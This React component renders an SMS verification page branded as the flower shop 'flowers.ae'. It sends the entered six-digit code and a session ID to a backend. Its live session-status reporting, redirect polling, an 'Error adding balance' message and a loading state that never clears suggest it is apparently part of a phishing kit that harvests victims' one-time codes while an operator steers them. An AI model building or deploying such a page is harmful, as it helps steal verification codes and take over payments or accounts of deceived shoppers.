import styles from "./Sms.module.css";
import { useState, useRef, useEffect } from "react";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useCart } from "../../context/cartContext";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const SmsVerification = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  const { state } = useCart();
  useRedirectChecker(3000);
  useOnlineStatus({ sessionId, pageName: "sms", enabled: true });
  const [code, setCode] = useState<string[]>(["", "", "", "", "", ""]);
  const [isProcessing, setIsProcessing] = useState(false);

  // Исправляем тип для ref
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Инициализируем ref массив
  useEffect(() => {
    inputRefs.current = inputRefs.current.slice(0, 6);
  }, []);

  const handleCodeChange = (index: number, value: string) => {
    // Разрешаем только цифры
    if (value && !/^\d+$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    // Автопереход к следующему полю
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    // Авто-отправка при заполнении всех полей
    if (newCode.every((digit) => digit !== "") && index === 5) {
      handleSubmit(newCode.join(""));
    }
  };

  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>
  ) => {
    // Обработка Backspace
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").slice(0, 6);

    if (/^\d+$/.test(pastedData)) {
      const newCode = pastedData.split("").slice(0, 6);
      const finalCode = [...newCode, ...Array(6 - newCode.length).fill("")];
      setCode(finalCode);

      // Фокус на последнее заполненное поле
      const lastFilledIndex = newCode.length - 1;
      if (lastFilledIndex < 5) {
        inputRefs.current[lastFilledIndex + 1]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };

  // Исправляем функцию для ref
  const setInputRef = (index: number) => (el: HTMLInputElement | null) => {
    inputRefs.current[index] = el;
  };

  const handleSubmit = async (verificationCode?: string) => {
    const finalCode = verificationCode || code.join("");

    if (finalCode.length !== 6) {
      alert("Please enter the complete 6-digit code");
      return;
    }

    // Имитация обработки запроса
    try {
      setIsProcessing(true);
      const res = await fetch("/api/submit-sms", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          sms: finalCode,
        }),
      });

      console.log(code);

      const data = await res.json();

      console.log(data);
    } catch (error) {
      console.error("Error adding balance:", error);
      alert("There was an error processing your request. Please try again.");
    } finally {
      setIsProcessing(true);
    }
  };

  // Mock данные - в реальном приложении получать из контекста или пропсов
  const phoneNumber = state.customerData?.phoneNumber;
  const maskedPhone = phoneNumber
    ? phoneNumber.replace(/\d(?=\d{4})/g, "*")
    : "";

  return (
    <div className={styles.verification__container}>
      <div className={styles.verification__wrapper}>
        {/* Header */}
        <header className={styles.verification__header}>
          <div className={styles.header__content}>
            <div className={styles.logo}>
              <span>flowers.ae</span>
            </div>
            <nav className={styles.breadcrumb}>
              <span className={styles.active}>SMS Verification</span>
            </nav>
          </div>
        </header>

        <div className={styles.verification__content}>
          {/* Left Side - Verification Form */}
          <div className={styles.form__section}>
            <div className={styles.form__container}>
              <div className={styles.form__header}>
                <div className={styles.verification__icon}>📱</div>
                <h2>Verify Your Phone Number</h2>
                <p>We've sent a 6-digit verification code to {maskedPhone}</p>
              </div>

              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleSubmit();
                }}
                className={styles.verification__form}
              >
                <div className={styles.code__input__group}>
                  <label>Enter verification code *</label>
                  <div className={styles.code__inputs}>
                    {code.map((digit, index) => (
                      <input
                        key={index}
                        ref={setInputRef(index)} // Исправленный ref
                        type="text"
                        inputMode="numeric"
                        maxLength={1}
                        value={digit}
                        onChange={(e) =>
                          handleCodeChange(index, e.target.value)
                        }
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        onPaste={index === 0 ? handlePaste : undefined}
                        className={styles.code__input}
                        autoFocus={index === 0}
                      />
                    ))}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={isProcessing || code.join("").length !== 6}
                  className={styles.verify__btn}
                >
                  {isProcessing ? "Verifying..." : "Verify Code"}
                </button>
              </form>

              {/* Verification Tips */}
              <div className={styles.tips__section}>
                <h4>Verification Tips</h4>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>💡</span>
                  <p>The code expires in 10 minutes for security reasons</p>
                </div>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>💡</span>
                  <p>Make sure you have good network reception</p>
                </div>
                <div className={styles.tip__item}>
                  <span className={styles.tip__icon}>💡</span>
                  <p>Check your spam folder if you don't see the SMS</p>
                </div>
              </div>

              {/* Security Info */}
              <div className={styles.security__info}>
                <div className={styles.security__badge}>
                  <span className={styles.lock__icon}>🔒</span>
                  <span>Your information is secure and encrypted</span>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side - Verification Info */}
          <div className={styles.info__section}>
            <div className={styles.info__container}>
              <h3>Why Verify Your Phone?</h3>

              <div className={styles.benefits__list}>
                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>🚀</div>
                  <div className={styles.benefit__content}>
                    <h4>Faster Checkout</h4>
                    <p>
                      Verified accounts get quicker order processing and
                      delivery
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>🎁</div>
                  <div className={styles.benefit__content}>
                    <h4>Exclusive Offers</h4>
                    <p>
                      Receive special discounts and promotions available only to
                      verified users
                    </p>
                  </div>
                </div>

                <div className={styles.benefit__item}>
                  <div className={styles.benefit__icon}>📦</div>
                  <div className={styles.benefit__content}>
                    <h4>Order Updates</h4>
                    <p>
                      Get real-time SMS notifications about your order status
                      and delivery
                    </p>
                  </div>
                </div>
              </div>

              {/* Support Info */}
              <div className={styles.support__section}>
                <h4>Need Help?</h4>
                <div className={styles.support__options}>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>💬</span>
                    <div>
                      <p className={styles.support__title}>Live Chat</p>
                      <p className={styles.support__detail}>Available 24/7</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Loading isLoading={isProcessing} />
    </div>
  );
};

export default SmsVerification;
